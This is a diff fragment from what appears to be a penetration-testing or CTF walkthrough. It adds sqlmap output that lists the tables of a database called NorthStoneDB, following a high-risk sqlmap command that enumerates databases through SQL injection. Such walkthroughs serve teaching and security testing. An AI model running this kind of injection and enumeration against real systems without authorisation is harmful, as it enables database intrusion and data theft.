@@ -176,4 +176,13 @@ There are 4 default databases
 
 ```python
 sqlmap -r request.txt --level=4 --risk=3 --dbs --flush-session --batch -D NorthStoneDB --tables
+
+[17:47:02] [INFO] fetching tables for database: NorthStoneDB
+Database: NorthStoneDB
+[2 tables]
++-----------------+
+| Properties      |
+| auth_test_users |
++-----------------+
 ```
+
